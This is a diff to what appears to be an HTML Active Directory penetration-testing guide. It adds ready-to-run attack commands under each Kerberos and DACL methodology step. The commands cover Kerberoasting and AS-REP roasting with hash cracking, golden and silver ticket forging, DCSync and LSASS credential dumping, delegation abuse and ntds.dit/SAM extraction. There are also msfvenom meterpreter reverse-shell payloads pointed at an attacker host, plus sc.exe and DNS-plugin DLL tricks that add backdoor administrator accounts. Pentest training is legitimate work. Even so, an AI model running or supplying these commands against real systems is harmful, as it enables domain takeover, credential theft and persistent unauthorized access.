@@ -1551,8 +1551,14 @@ python ntlmrelayx.py -tf targets.txt -smb2support</code></pre>
 <p>Every Kerberos attack starts with a valid user list and a target DC. The per-attack methodology blocks below assume this baseline has been established.</p>
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-kerberos-enum-wf-0"> Build a user list with Kerbrute, RID brute, or LDAP.</li>
-<li><input type="checkbox" data-id="cape-kerberos-enum-wf-1"> Identify the DC (SPN <code>ldap/*</code>, <code>krbtgt</code> account, PDC role).</li>
+<li><input type="checkbox" data-id="cape-kerberos-enum-wf-0"> Build a user list with Kerbrute, RID brute, or LDAP.
+<pre><code class="language-bash">python3 kerbrute.py userenum --dc &lt;dc&gt; -d domain.local users.txt
+netexec smb &lt;dc-ip&gt; -u '' -p '' --rid-brute</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-enum-wf-1"> Identify the DC (SPN <code>ldap/*</code>, <code>krbtgt</code> account, PDC role).
+<pre><code class="language-bash">nxc smb &lt;dc-ip&gt; -u user -p pass --shares
+setspn -T domain.local -Q ldap/*</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-kerberos-enumeration">6.4 Enumerating Usernames and Tickets</h3>
@@ -1579,8 +1585,14 @@ python ntlmrelayx.py -tf targets.txt -smb2support</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-kerberos-asrep-wf-0"> Locate accounts with <code>DONT_REQ_PREAUTH</code> in <code>userAccountControl</code>.</li>
-<li><input type="checkbox" data-id="cape-kerberos-asrep-wf-1"> Fetch AS-REPs with <code>GetNPUsers.py -format hashcat</code> and crack with <code>hashcat -m 18200</code>.</li>
+<li><input type="checkbox" data-id="cape-kerberos-asrep-wf-0"> Locate accounts with <code>DONT_REQ_PREAUTH</code> in <code>userAccountControl</code>.
+<pre><code class="language-powershell">Get-DomainUser -PreauthNotRequired
+ldapsearch -H ldap://&lt;dc&gt; -x -D 'user@domain.local' -w pass -b 'DC=domain,DC=local' '(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-asrep-wf-1"> Fetch AS-REPs with <code>GetNPUsers.py -format hashcat</code> and crack with <code>hashcat -m 18200</code>.
+<pre><code class="language-bash">python3 GetNPUsers.py -dc-ip &lt;dc&gt; domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-kerberos-brute-force">6.7 Brute Forcing Usernames and Passwords</h3>
@@ -1593,8 +1605,14 @@ python ntlmrelayx.py -tf targets.txt -smb2support</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-kerberos-roast-wf-0"> Enumerate user accounts with a populated <code>servicePrincipalName</code>.</li>
-<li><input type="checkbox" data-id="cape-kerberos-roast-wf-1"> Request TGS with <code>GetUserSPNs.py -outputfile</code>, then crack with <code>hashcat -m 13100</code>.</li>
+<li><input type="checkbox" data-id="cape-kerberos-roast-wf-0"> Enumerate user accounts with a populated <code>servicePrincipalName</code>.
+<pre><code class="language-powershell">Get-DomainUser -SPN
+setspn -T domain.local -Q */*</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-roast-wf-1"> Request TGS with <code>GetUserSPNs.py -outputfile</code>, then crack with <code>hashcat -m 13100</code>.
+<pre><code class="language-bash">python3 GetUserSPNs.py -dc-ip &lt;dc&gt; domain.local/user:pass -outputfile spns.hash
+hashcat -m 13100 spns.hash /usr/share/wordlists/rockyou.txt</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-kerberos-tgt-bruteforce">6.9 Brute Forcing a User Hash via TGT Retrieval</h3>
@@ -1647,9 +1665,15 @@ done</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-kerberos-golden-wf-0"> DCSync KRBTGT: <code>lsadump::dcsync /user:krbtgt</code>.</li>
-<li><input type="checkbox" data-id="cape-kerberos-golden-wf-1"> Forge and inject: <code>kerberos::golden /admin:... /sid:&lt;domain-sid&gt; /krbtgt:&lt;hash&gt; /id:500 /ptt</code>.</li>
-<li><input type="checkbox" data-id="cape-kerberos-golden-wf-2"> Verify with <code>dir \\&lt;dc&gt;\c$</code> from the current session.</li>
+<li><input type="checkbox" data-id="cape-kerberos-golden-wf-0"> DCSync KRBTGT: <code>lsadump::dcsync /user:krbtgt</code>.
+<pre><code class="language-bash">mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-golden-wf-1"> Forge and inject: <code>kerberos::golden /admin:... /sid:&lt;domain-sid&gt; /krbtgt:&lt;hash&gt; /id:500 /ptt</code>.
+<pre><code class="language-bash">mimikatz # kerberos::golden /admin:pass /domain:domain.local /id:500 /sid:&lt;domain-sid&gt; /krbtgt:&lt;hash&gt; /endin:600 /renewmax:10080 /ptt</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-golden-wf-2"> Verify with <code>dir \\&lt;dc&gt;\c$</code> from the current session.
+<pre><code class="language-bash">dir \\&lt;dc-fqdn&gt;\c$\</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-kerberos-silver-tickets">6.11 Silver Tickets</h3>
@@ -1679,8 +1703,14 @@ done</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-kerberos-silver-wf-0"> Recover the target machine account's NTLM hash (LSASS dump, DCSync, or reused local admin).</li>
-<li><input type="checkbox" data-id="cape-kerberos-silver-wf-1"> Forge with <code>kerberos::golden /target:&lt;host&gt; /rc4:&lt;machine-hash&gt; /service:cifs /ptt</code>.</li>
+<li><input type="checkbox" data-id="cape-kerberos-silver-wf-0"> Recover the target machine account's NTLM hash (LSASS dump, DCSync, or reused local admin).
+<pre><code class="language-bash">mimikatz # sekurlsa::logonpasswords
+mimikatz # lsadump::dcsync /user:&lt;machine&gt;$</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-silver-wf-1"> Forge with <code>kerberos::golden /target:&lt;host&gt; /rc4:&lt;machine-hash&gt; /service:cifs /ptt</code>.
+<pre><code class="language-bash">mimikatz # kerberos::golden /admin:pass /domain:domain.local /id:500 /sid:&lt;domain-sid&gt; /target:&lt;target-fqdn&gt; /rc4:&lt;machine-hash&gt; /service:cifs /ptt
+dir \\&lt;target-fqdn&gt;\c$\</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-kerberos-optkh">6.12 Overpass-the-Hash</h3>
@@ -1698,9 +1728,17 @@ smbclient.py -k &lt;domain.local&gt;/&lt;user&gt;@&lt;target-fqdn&gt;</code></pr
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-kerberos-optkh-wf-0"> Recover the NTLM hash (LSASS dump, DCSync, LAPS, cached credentials).</li>
-<li><input type="checkbox" data-id="cape-kerberos-optkh-wf-1"> Request a TGT with <code>Rubeus asktgt /rc4:&lt;hash&gt; /ptt</code> or <code>getTGT.py -hashes :&lt;hash&gt;</code>.</li>
-<li><input type="checkbox" data-id="cape-kerberos-optkh-wf-2"> Prefer <code>/aes256:</code> in hardened domains that disable RC4 pre-auth.</li>
+<li><input type="checkbox" data-id="cape-kerberos-optkh-wf-0"> Recover the NTLM hash (LSASS dump, DCSync, LAPS, cached credentials).
+<pre><code class="language-bash">mimikatz # sekurlsa::logonpasswords
+secretsdump.py -just-dc-user &lt;user&gt; domain.local/&lt;da&gt;:pass@&lt;dc&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-optkh-wf-1"> Request a TGT with <code>Rubeus asktgt /rc4:&lt;hash&gt; /ptt</code> or <code>getTGT.py -hashes :&lt;hash&gt;</code>.
+<pre><code class="language-bash">Rubeus.exe asktgt /user:&lt;user&gt; /rc4:&lt;ntlm-hash&gt; /domain:domain.local /dc:&lt;dc-fqdn&gt; /ptt
+getTGT.py -hashes :&lt;ntlm-hash&gt; domain.local/&lt;user&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-optkh-wf-2"> Prefer <code>/aes256:</code> in hardened domains that disable RC4 pre-auth.
+<pre><code class="language-bash">Rubeus.exe asktgt /user:&lt;user&gt; /aes256:&lt;aes256-key&gt; /domain:domain.local /dc:&lt;dc-fqdn&gt; /ptt</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-kerberos-unconstrained-chain">6.13 Unconstrained Delegation Attack Chain</h3>
@@ -1728,10 +1766,20 @@ mimikatz # lsadump::dcsync /domain:&lt;domain.local&gt; /user:krbtgt</code></pre
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-kerberos-unconstrained-wf-0"> Enumerate hosts with <code>TRUSTED_FOR_DELEGATION</code> via PowerView or LDAP.</li>
-<li><input type="checkbox" data-id="cape-kerberos-unconstrained-wf-1"> On the compromised UD host, run <code>Rubeus monitor /filteruser:&lt;target&gt;$</code>.</li>
-<li><input type="checkbox" data-id="cape-kerberos-unconstrained-wf-2"> Coerce the target with SpoolSample, PetitPotam, or DFSCoerce.</li>
-<li><input type="checkbox" data-id="cape-kerberos-unconstrained-wf-3"> Inject the captured TGT with <code>Rubeus ptt</code>, then DCSync.</li>
+<li><input type="checkbox" data-id="cape-kerberos-unconstrained-wf-0"> Enumerate hosts with <code>TRUSTED_FOR_DELEGATION</code> via PowerView or LDAP.
+<pre><code class="language-powershell">Get-DomainComputer -Unconstrained -Properties samaccountname, dnshostname</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-unconstrained-wf-1"> On the compromised UD host, run <code>Rubeus monitor /filteruser:&lt;target&gt;$</code>.
+<pre><code class="language-bash">Rubeus.exe monitor /interval:5 /filteruser:&lt;target-dc&gt;$</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-unconstrained-wf-2"> Coerce the target with SpoolSample, PetitPotam, or DFSCoerce.
+<pre><code class="language-bash">SpoolSample.exe &lt;target-dc&gt;.domain.local &lt;ud-host&gt;.domain.local
+python3 PetitPotam.py -u user -p pass -d domain &lt;ud-host&gt; &lt;target-dc&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-unconstrained-wf-3"> Inject the captured TGT with <code>Rubeus ptt</code>, then DCSync.
+<pre><code class="language-bash">Rubeus.exe ptt /ticket:&lt;base64-ticket&gt;
+mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-kerberos-constrained">6.14 Constrained Delegation (S4U2Self / S4U2Proxy)</h3>
@@ -1760,9 +1808,17 @@ smbclient.py -k &lt;domain.local&gt;/administrator@&lt;target-fqdn&gt;</code></p
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-kerberos-constrained-wf-0"> Enumerate accounts with a populated <code>msDS-AllowedToDelegateTo</code>.</li>
-<li><input type="checkbox" data-id="cape-kerberos-constrained-wf-1"> Compromise the source service account, get a TGT (<code>getTGT.py</code>).</li>
-<li><input type="checkbox" data-id="cape-kerberos-constrained-wf-2"> Chain S4U2Self and S4U2Proxy with <code>getST.py -impersonate administrator</code> or <code>Rubeus s4u</code>.</li>
+<li><input type="checkbox" data-id="cape-kerberos-constrained-wf-0"> Enumerate accounts with a populated <code>msDS-AllowedToDelegateTo</code>.
+<pre><code class="language-powershell">Get-DomainUser -TrustedToAuth -Properties samaccountname, msds-allowedtodelegateto</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-constrained-wf-1"> Compromise the source service account, get a TGT (<code>getTGT.py</code>).
+<pre><code class="language-bash">getTGT.py domain.local/&lt;service-user&gt;:pass
+export KRB5CCNAME=&lt;service-user&gt;.ccache</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-constrained-wf-2"> Chain S4U2Self and S4U2Proxy with <code>getST.py -impersonate administrator</code> or <code>Rubeus s4u</code>.
+<pre><code class="language-bash">getST.py -spn cifs/&lt;target-fqdn&gt; -impersonate administrator domain.local/&lt;service-user&gt;:pass
+Rubeus.exe s4u /user:&lt;service-user&gt; /rc4:&lt;ntlm-hash&gt; /impersonateuser:administrator /msdsspn:cifs/&lt;target-fqdn&gt; /altservice:cifs,host,http /ptt</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-kerberos-rbcd">6.15 Resource-Based Constrained Delegation</h3>
@@ -1788,11 +1844,23 @@ psexec.py -k -no-pass &lt;domain.local&gt;/administrator@&lt;target-fqdn&gt;</co
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-kerberos-rbcd-wf-0"> Confirm write access on the target computer's SD (or that MachineAccountQuota is non-zero).</li>
-<li><input type="checkbox" data-id="cape-kerberos-rbcd-wf-1"> Create a controlled computer account with <code>addcomputer.py</code>.</li>
-<li><input type="checkbox" data-id="cape-kerberos-rbcd-wf-2"> Write <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on the target with <code>rbcd.py -action write</code>.</li>
-<li><input type="checkbox" data-id="cape-kerberos-rbcd-wf-3"> S4U as the created computer with <code>getST.py -impersonate administrator</code>, then use the ticket.</li>
-<li><input type="checkbox" data-id="cape-kerberos-rbcd-wf-4"> Flush the delegation attribute when finished.</li>
+<li><input type="checkbox" data-id="cape-kerberos-rbcd-wf-0"> Confirm write access on the target computer's SD (or that MachineAccountQuota is non-zero).
+<pre><code class="language-powershell">Get-DomainObjectAcl -Identity &lt;target-computer&gt;$ -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match 'GenericWrite|GenericAll|WriteDacl|WriteProperty' }
+Get-DomainObject -SearchBase 'CN=Users,DC=domain,DC=local' -Filter 'ms-DS-MachineAccountQuota=*' -Properties ms-DS-MachineAccountQuota</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-rbcd-wf-1"> Create a controlled computer account with <code>addcomputer.py</code>.
+<pre><code class="language-bash">python3 addcomputer.py -computer-name FAKE01$ -computer-pass pass -dc-ip &lt;dc-ip&gt; domain.local/user:pass</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-rbcd-wf-2"> Write <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on the target with <code>rbcd.py -action write</code>.
+<pre><code class="language-bash">python3 rbcd.py -delegate-from FAKE01$ -delegate-to &lt;target-computer&gt;$ -dc-ip &lt;dc-ip&gt; domain.local/user:pass -action write</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-rbcd-wf-3"> S4U as the created computer with <code>getST.py -impersonate administrator</code>, then use the ticket.
+<pre><code class="language-bash">python3 getST.py -spn cifs/&lt;target-fqdn&gt; -impersonate administrator domain.local/FAKE01$:pass
+psexec.py -k -no-pass domain.local/administrator@&lt;target-fqdn&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-rbcd-wf-4"> Flush the delegation attribute when finished.
+<pre><code class="language-bash">python3 rbcd.py -delegate-to &lt;target-computer&gt;$ -dc-ip &lt;dc-ip&gt; domain.local/user:pass -action flush</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-kerberos-unpac">6.16 UnPAC-the-Hash</h3>
@@ -1811,8 +1879,12 @@ psexec.py -k -no-pass &lt;domain.local&gt;/administrator@&lt;target-fqdn&gt;</co
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-kerberos-unpac-wf-0"> After any ADCS primitive that yields a PFX, run <code>certipy auth -pfx &lt;user&gt;.pfx</code>.</li>
-<li><input type="checkbox" data-id="cape-kerberos-unpac-wf-1"> Alternate: <code>Rubeus asktgt /certificate:&lt;pfx&gt; /getcredentials</code> to pull the NTLM out of the PAC.</li>
+<li><input type="checkbox" data-id="cape-kerberos-unpac-wf-0"> After any ADCS primitive that yields a PFX, run <code>certipy auth -pfx &lt;user&gt;.pfx</code>.
+<pre><code class="language-bash">certipy auth -pfx &lt;user&gt;.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-unpac-wf-1"> Alternate: <code>Rubeus asktgt /certificate:&lt;pfx&gt; /getcredentials</code> to pull the NTLM out of the PAC.
+<pre><code class="language-bash">Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;pfx-base64&gt; /password:'&lt;pfx-password&gt;' /getcredentials /show</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-kerberos-ntds-cracking">6.17 Cracking ntds.dit and Registry Hives</h3>
@@ -1823,8 +1895,15 @@ psexec.py -k -no-pass &lt;domain.local&gt;/administrator@&lt;target-fqdn&gt;</co
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-kerberos-ntds-wf-0"> Exfiltrate <code>ntds.dit</code> and the SYSTEM registry hive (VSS, ntdsutil, or file copy on backups).</li>
-<li><input type="checkbox" data-id="cape-kerberos-ntds-wf-1"> Run <code>secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL</code> and crack with <code>hashcat -m 1000</code>.</li>
+<li><input type="checkbox" data-id="cape-kerberos-ntds-wf-0"> Exfiltrate <code>ntds.dit</code> and the SYSTEM registry hive (VSS, ntdsutil, or file copy on backups).
+<pre><code class="language-bash"># On the DC:
+diskshadow.exe /s script.txt
+reg save HKLM\SYSTEM C:\temp\SYSTEM</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-ntds-wf-1"> Run <code>secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL</code> and crack with <code>hashcat -m 1000</code>.
+<pre><code class="language-bash">secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL &gt; hashes.txt
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-kerberos-ldap-passback">6.18 LDAP Pass-back Attack</h3>
@@ -1833,8 +1912,16 @@ psexec.py -k -no-pass &lt;domain.local&gt;/administrator@&lt;target-fqdn&gt;</co
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-kerberos-passback-wf-0"> Access the app's admin/config UI (default creds, foothold, or session hijack).</li>
-<li><input type="checkbox" data-id="cape-kerberos-passback-wf-1"> Point the LDAP server field at your listener, trigger the connection test, capture the credential.</li>
+<li><input type="checkbox" data-id="cape-kerberos-passback-wf-0"> Access the app's admin/config UI (default creds, foothold, or session hijack).
+<pre><code class="language-bash">curl -s -u admin:admin http://&lt;app-fqdn&gt;/admin/settings
+# Or try Nuclei's default-credentials templates against the target
+nuclei -t http/default-logins/ -u http://&lt;app-fqdn&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-kerberos-passback-wf-1"> Point the LDAP server field at your listener, trigger the connection test, capture the credential.
+<pre><code class="language-bash"># Point the app's LDAP server field at your listener
+nc -lvnp 389
+# Trigger the connection test; capture the bind DN + password in cleartext</code></pre>
+</li>
 </ul>
 
 <h2 id="cape-dacl-1-7">7. DACL Attacks I</h2>
@@ -1925,9 +2012,21 @@ $obj.Workbooks.Open('\\attacker\share\payload.xls')</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-dacl2-dcom-excel-wf-0"> Confirm local admin on the source workstation and that <code>Excel.Application</code> is reachable via DCOM on the target.</li>
-<li><input type="checkbox" data-id="cape-dacl2-dcom-excel-wf-1"> Drop a macro-enabled XLS with an AutoOpen payload on a share the target can read.</li>
-<li><input type="checkbox" data-id="cape-dacl2-dcom-excel-wf-2"> Trigger the remote workbook open via <code>Workbooks.Open</code> against the DCOM Excel object.</li>
+<li><input type="checkbox" data-id="cape-dacl2-dcom-excel-wf-0"> Confirm local admin on the source workstation and that <code>Excel.Application</code> is reachable via DCOM on the target.
+<pre><code class="language-powershell"># Confirm local admin on the source
+whoami /groups | Select-String Admin
+# Check DCOM reachability to the target
+Test-NetConnection &lt;target&gt; -Port 135</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-dcom-excel-wf-1"> Drop a macro-enabled XLS with an AutoOpen payload on a share the target can read.
+<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;attacker&gt; LPORT=4444 -f vba</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-dcom-excel-wf-2"> Trigger the remote workbook open via <code>Workbooks.Open</code> against the DCOM Excel object.
+<pre><code class="language-powershell">$com = [Type]::GetTypeFromProgID('Excel.Application', '&lt;target&gt;')
+$obj = [System.Activator]::CreateInstance($com)
+$obj.DisplayAlerts = $false
+$obj.Workbooks.Open('\\attacker\share\payload.xls')</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-dacl2-dcsync">8.2 Performing DCSync</h3>
@@ -1958,9 +2057,16 @@ mimikatz # lsadump::dcsync /domain:<domain.local> /user:krbtgt</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-dacl2-dcsync-wf-0"> Verify the current principal holds <code>DS-Replication-Get-Changes</code> and <code>DS-Replication-Get-Changes-All</code> (BloodHound edge <code>GetChanges</code> and <code>GetChangesAll</code>).</li>
-<li><input type="checkbox" data-id="cape-dacl2-dcsync-wf-1"> Dump every account with <code>secretsdump.py -just-dc-ntlm</code>, or pull a single account with <code>lsadump::dcsync /user:</code>.</li>
-<li><input type="checkbox" data-id="cape-dacl2-dcsync-wf-2"> Grab KRBTGT for Golden Ticket persistence when Domain Admin is in scope.</li>
+<li><input type="checkbox" data-id="cape-dacl2-dcsync-wf-0"> Verify the current principal holds <code>DS-Replication-Get-Changes</code> and <code>DS-Replication-Get-Changes-All</code> (BloodHound edge <code>GetChanges</code> and <code>GetChangesAll</code>).
+<pre><code class="language-powershell">Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -match 'DS-Replication-Get-Changes' }</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-dcsync-wf-1"> Dump every account with <code>secretsdump.py -just-dc-ntlm</code>, or pull a single account with <code>lsadump::dcsync /user:</code>.
+<pre><code class="language-bash">secretsdump.py domain.local/user:pass@&lt;dc&gt; -just-dc-ntlm
+mimikatz # lsadump::dcsync /domain:domain.local /user:&lt;target&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-dcsync-wf-2"> Grab KRBTGT for Golden Ticket persistence when Domain Admin is in scope.
+<pre><code class="language-bash">mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-dacl2-sebackup">8.3 Exploiting SeBackupPrivilege</h3>
@@ -1992,9 +2098,19 @@ reg.exe save hklm\system C:\temp\SYSTEM</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-dacl2-sebackup-wf-0"> Verify <code>SeBackupPrivilege</code> is present and enabled with <code>whoami /priv</code>.</li>
-<li><input type="checkbox" data-id="cape-dacl2-sebackup-wf-1"> Snapshot the volume via diskshadow, or export SAM / SECURITY / SYSTEM with <code>reg save</code>.</li>
-<li><input type="checkbox" data-id="cape-dacl2-sebackup-wf-2"> Process <code>ntds.dit</code> or the SAM hive offline with <code>secretsdump.py LOCAL</code>.</li>
+<li><input type="checkbox" data-id="cape-dacl2-sebackup-wf-0"> Verify <code>SeBackupPrivilege</code> is present and enabled with <code>whoami /priv</code>.
+<pre><code class="language-bash">whoami /priv | findstr SeBackup</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-sebackup-wf-1"> Snapshot the volume via diskshadow, or export SAM / SECURITY / SYSTEM with <code>reg save</code>.
+<pre><code class="language-bash">diskshadow.exe /s C:\temp\script.txt
+reg save HKLM\SAM C:\temp\SAM
+reg save HKLM\SECURITY C:\temp\SECURITY
+reg save HKLM\SYSTEM C:\temp\SYSTEM</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-sebackup-wf-2"> Process <code>ntds.dit</code> or the SAM hive offline with <code>secretsdump.py LOCAL</code>.
+<pre><code class="language-bash">secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-dacl2-semanagevolume">8.4 Exploiting SeManageVolumePrivilege</h3>
@@ -2005,8 +2121,14 @@ reg.exe save hklm\system C:\temp\SYSTEM</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-dacl2-semanagevolume-wf-0"> Confirm <code>SeManageVolumePrivilege</code> is present with <code>whoami /priv</code>.</li>
-<li><input type="checkbox" data-id="cape-dacl2-semanagevolume-wf-1"> Run <code>SeManageVolumeExploit.exe</code> to gain arbitrary write on <code>C:\Windows</code>, then drop a DLL a signed binary side-loads.</li>
+<li><input type="checkbox" data-id="cape-dacl2-semanagevolume-wf-0"> Confirm <code>SeManageVolumePrivilege</code> is present with <code>whoami /priv</code>.
+<pre><code class="language-bash">whoami /priv | findstr SeManageVolume</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-semanagevolume-wf-1"> Run <code>SeManageVolumeExploit.exe</code> to gain arbitrary write on <code>C:\Windows</code>, then drop a DLL a signed binary side-loads.
+<pre><code class="language-bash">SeManageVolumeExploit.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;attacker&gt; LPORT=4444 -f dll -o payload.dll
+copy payload.dll C:\Windows\System32\&lt;hijackable&gt;.dll</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-dacl2-pac">8.5 Exploiting PAC in Kerberos (MS14-068)</h3>
@@ -2015,8 +2137,13 @@ reg.exe save hklm\system C:\temp\SYSTEM</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-dacl2-pac-wf-0"> Check the DC patch level; MS14-068 pre-dates the KB2992611 fix.</li>
-<li><input type="checkbox" data-id="cape-dacl2-pac-wf-1"> Run <code>goldenPac.py</code> against the DC with any authenticated user's credentials.</li>
+<li><input type="checkbox" data-id="cape-dacl2-pac-wf-0"> Check the DC patch level; MS14-068 pre-dates the KB2992611 fix.
+<pre><code class="language-bash"># Check patch level (KB2992611 fixes MS14-068)
+wmic qfe list brief | findstr 2992611</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-pac-wf-1"> Run <code>goldenPac.py</code> against the DC with any authenticated user's credentials.
+<pre><code class="language-bash">python3 goldenPac.py domain.local/user:pass@dc.domain.local</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-dacl2-server-operators">8.6 Exploiting Server Operators Group</h3>
@@ -2027,9 +2154,17 @@ sc.exe start &lt;service_name&gt;</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-dacl2-serverops-wf-0"> Verify Server Operators membership on the current user (or a foothold account).</li>
-<li><input type="checkbox" data-id="cape-dacl2-serverops-wf-1"> Locate a SYSTEM-running service on the DC whose <code>binPath</code> you can modify with <code>sc.exe config</code>.</li>
-<li><input type="checkbox" data-id="cape-dacl2-serverops-wf-2"> Set the <code>binPath</code> to your payload, start the service, then restore the original config.</li>
+<li><input type="checkbox" data-id="cape-dacl2-serverops-wf-0"> Verify Server Operators membership on the current user (or a foothold account).
+<pre><code class="language-powershell">Get-ADGroupMember "Server Operators"</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-serverops-wf-1"> Locate a SYSTEM-running service on the DC whose <code>binPath</code> you can modify with <code>sc.exe config</code>.
+<pre><code class="language-bash">sc.exe qc &lt;service_name&gt;</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-serverops-wf-2"> Set the <code>binPath</code> to your payload, start the service, then restore the original config.
+<pre><code class="language-bash">sc.exe config &lt;service_name&gt; binPath= "cmd.exe /c net user attacker &lt;password&gt; /add &amp;&amp; net localgroup administrators attacker /add"
+sc.exe start &lt;service_name&gt;
+sc.exe config &lt;service_name&gt; binPath= "&lt;original-binpath&gt;"</code></pre>
+</li>
 </ul>
 
 <h3 id="cape-dacl2-dnsadmin">8.7 Exploiting DNS Admin Group</h3>
@@ -2043,9 +2178,17 @@ sc.exe \\&lt;dc&gt; start dns</code></pre>
 
 <h5>Methodology</h5>
 <ul class="methodology-checklist">
-<li><input type="checkbox" data-id="cape-dacl2-dnsadmin-wf-0"> Verify DNSAdmins membership.</li>
-<li><input type="checkbox" data-id="cape-dacl2-dnsadmin-wf-1"> Compile a DLL that runs your payload from <code>DllMain</code>.</li>
-<li><input type="checkbox" data-id="cape-dacl2-dnsadmin-wf-2"> Register with <code>dnscmd /config /serverlevelplugindll</code>, then restart the DNS service to trigger load as SYSTEM.</li>
+<li><input type="checkbox" data-id="cape-dacl2-dnsadmin-wf-0"> Verify DNSAdmins membership.
+<pre><code class="language-powershell">Get-ADGroupMember "DnsAdmins"</code></pre>
+</li>
+<li><input type="checkbox" data-id="cape-dacl2-dnsadmin-wf-1"> Compile a DLL that runs your payload from <code>DllMain</code>.
+<pre><code class="language-bash">msfvenom -p windows/x64/exec CMD='net user test &lt;password&gt; /add &amp;&amp; net group "Domain Admins" test /add /domain' -f dll -o adduser.dll</code></pre>
+</li>
